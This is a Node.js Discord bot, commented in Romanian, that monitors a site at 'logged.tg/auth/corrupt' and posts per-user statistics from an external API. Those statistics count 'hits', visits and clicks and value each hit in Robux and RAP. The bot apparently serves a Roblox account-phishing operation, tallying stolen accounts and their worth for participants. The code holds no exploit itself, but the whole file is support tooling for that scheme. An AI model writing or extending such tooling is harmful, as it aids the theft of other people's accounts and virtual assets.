// 1️⃣ Importuri
const { Client, GatewayIntentBits, EmbedBuilder } = require('discord.js');
const fetch = require('node-fetch');
const express = require('express');

// 2️⃣ Server Express pentru keep-alive
const app = express();
const PORT = process.env.PORT || 3000;
app.get("/", (req, res) => res.send("Bot is alive ✅"));
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));

// 3️⃣ Creezi clientul Discord
const client = new Client({ 
  intents: [
    GatewayIntentBits.Guilds, 
    GatewayIntentBits.GuildMessages, 
    GatewayIntentBits.MessageContent
  ] 
});

const TOKEN = process.env.DISCORD_BOT_TOKEN;

// 4️⃣ Funcții utile
function formatDuration(ms) {
  let sec = Math.floor(ms / 1000);
  let min = Math.floor(sec / 60);
  let hr = Math.floor(min / 60);
  sec %= 60; min %= 60;
  return `${hr}h ${min}m ${sec}s`;
}

function formatNumber(num) { return num?.toLocaleString() || "0"; }

// 5️⃣ Config site & canal
let lastUpTime = null;
let lastStatus = null;
const STATUS_CHANNEL_ID = "1436098432413597726"; // Canal pentru announces
const MAIN_SITE_URL = "https://www.logged.tg/auth/corrupt";
const MAIN_SITE_NAME = "MAIN SITE";

// 6️⃣ Funcție embed pentru check/announces
function createStatusEmbed(status, ping) {
  const statusEmoji = status === "UP" ? "<a:corrupt_verify:1437152885480886312>" : "❌";
  const uptimeText = status === "UP" && lastUpTime ? formatDuration(Date.now() - lastUpTime) : "❌ No uptime data";

  return new EmbedBuilder()
    .setColor(0x1ABC9C)
    .setTitle(`— <a:emoji_22:1437165310775132160> SITE STATUS —`)
    .setThumbnail("<a:corrupt_crown:1437152941088702607>")
    .setDescription(
`<a:emoji_21:1437163698161717468> **${MAIN_SITE_NAME}**
<a:emoji_21:1437163698161717468> Status: ${status === "UP" ? "ONLINE" : "OFFLINE"} ${statusEmoji}
<a:emoji_21:1437163698161717468> Uptime: ${uptimeText}
<a:emoji_21:1437163698161717468> Response Time: ${ping ? ping + "ms" : "N/A"}`
    )
    .setImage("https://i.imgur.com/dg8a7VB.gif") // Banner sus
    .setFooter({ text: "Site Uptime Monitor" });
}

// 7️⃣ Interval pentru anunțuri automate
setInterval(async () => {
  try {
    const start = Date.now();
    let res, ping;
    try {
      const response = await fetch(MAIN_SITE_URL);
      res = { ok: response.ok };
      ping = Date.now() - start;
    } catch {
      res = { ok: false };
      ping = null;
    }

    const currentStatus = res.ok ? "UP" : "DOWN";
    if (res.ok && !lastUpTime) lastUpTime = Date.now();
    if (!res.ok) lastUpTime = null;

    if (currentStatus !== lastStatus) {
      const channel = client.channels.cache.get(STATUS_CHANNEL_ID);
      if (channel) {
        const embed = createStatusEmbed(currentStatus, ping);
        await channel.send({ embeds: [embed] });
      }
      lastStatus = currentStatus;
    }
  } catch (err) { console.error(err); }
}, 30000);

// 8️⃣ Funcție embed pentru stats/daily
async function sendStatsEmbed(titleText, statsData, footerText, targetUser) {
  const embed = new EmbedBuilder()
    .setColor(0x1ABC9C)
    .setTitle(`— <a:emoji_22:1437165310775132160> ${titleText} —`)
    .setThumbnail(targetUser.displayAvatarURL({ dynamic: true, size: 128 }))
    .setDescription(
`<a:emoji_21:1437163698161717468> **User:** ${targetUser.username}

<a:emoji_21:1437163698161717468> **TOTAL STATS:** 
\`\`\`
Hits:     ${formatNumber(statsData.Totals?.Accounts)}
Visits:   ${formatNumber(statsData.Totals?.Visits)}
Clicks:   ${formatNumber(statsData.Totals?.Clicks)}
\`\`\`

<a:emoji_21:1437163698161717468> **BIGGEST HIT:** 
\`\`\`
Summary:  ${formatNumber(statsData.Highest?.Summary)}
RAP:      ${formatNumber(statsData.Highest?.Rap)}
Robux:    ${formatNumber(statsData.Highest?.Balance)}
\`\`\`

<a:emoji_21:1437163698161717468> **TOTAL HIT STATS:** 
\`\`\`
Summary:  ${formatNumber(statsData.TotalSummary)}
RAP:      ${formatNumber(statsData.TotalRap)}
Robux:    ${formatNumber(statsData.TotalRobux)}
\`\`\``
    )
    .setImage("https://i.imgur.com/rCQ33gA.gif")
    .setFooter({ text: footerText });
  return embed;
}

// 9️⃣ Event listener pentru mesaje
client.on('messageCreate', async (message) => {
  if (message.author.bot) return;
  const targetUser = message.mentions.users.first() || message.author;
  const targetId = targetUser.id;

  // ===== !stats =====
  if (message.content.startsWith('!stats')) {
    try {
      const res = await fetch(`https://api.injuries.lu/v1/public/user?userId=${targetId}`);
      const data = await res.json();
      if (!data.success || !data.Normal) { return message.reply("❌ No stats found."); }

      const normal = data.Normal;

      // Calculează manual TOTAL HIT STATS
      let totalSummary = 0, totalRap = 0, totalRobux = 0;
      if (normal.Hits && Array.isArray(normal.Hits)) {
        normal.Hits.forEach(hit => {
          totalSummary += hit.Summary || 0;
          totalRap += hit.Rap || 0;
          totalRobux += hit.Balance || 0;
        });
      } else {
        totalSummary = normal.Totals?.Summary || 0;
        totalRap = normal.Totals?.Rap || 0;
        totalRobux = normal.Totals?.Balance || 0;
      }

      normal.TotalSummary = totalSummary;
      normal.TotalRap = totalRap;
      normal.TotalRobux = totalRobux;

      const embed = await sendStatsEmbed("NORMAL INFO", normal, "Stats Bot", targetUser);
      await message.channel.send({ embeds: [embed] });

    } catch (err) { console.error(err); message.reply("❌ Error fetching stats."); }
  }

  // ===== !daily =====
  if (message.content.startsWith('!daily')) {
    try {
      const DAILY_API = `https://api.injuries.lu/v2/daily?type=0x2&cs=3&ref=corrupteds&userId=${targetId}`;
      const res = await fetch(DAILY_API);
      const data = await res.json();

      if (!data || !data.Normal) { message.reply("❌ No daily stats found."); return; }

      const normal = data.Normal;
      normal.TotalSummary = normal.Totals?.Summary || 0;
      normal.TotalRap = normal.Totals?.Rap || 0;
      normal.TotalRobux = normal.Totals?.Balance || 0;

      const embed = await sendStatsEmbed("DAILY STATS", normal, "Stats Bot Daily", targetUser);
      await message.channel.send({ embeds: [embed] });

    } catch (err) { console.error(err); message.reply("❌ Error fetching daily stats."); }
  }

  // ===== !check =====
  if (message.content.startsWith('!check')) {
    try {
      const start = Date.now();
      let res, ping;
      try { const response = await fetch(MAIN_SITE_URL); res = { ok: response.ok }; ping = Date.now() - start; } 
      catch { res = { ok: false }; ping = null; }

      if (res.ok && !lastUpTime) lastUpTime = Date.now();
      if (!res.ok) lastUpTime = null;

      const embed = createStatusEmbed(res.ok ? "UP" : "DOWN", ping);
      await message.channel.send({ embeds: [embed] });
    } catch { message.reply("❌ Error fetching site status."); }
  }
});

// 10️⃣ Error handler
client.on('error', console.error);

// 11️⃣ Login bot
if (!TOKEN) { console.error('❌ DISCORD_BOT_TOKEN is not set!'); process.exit(1); }
client.login(TOKEN);
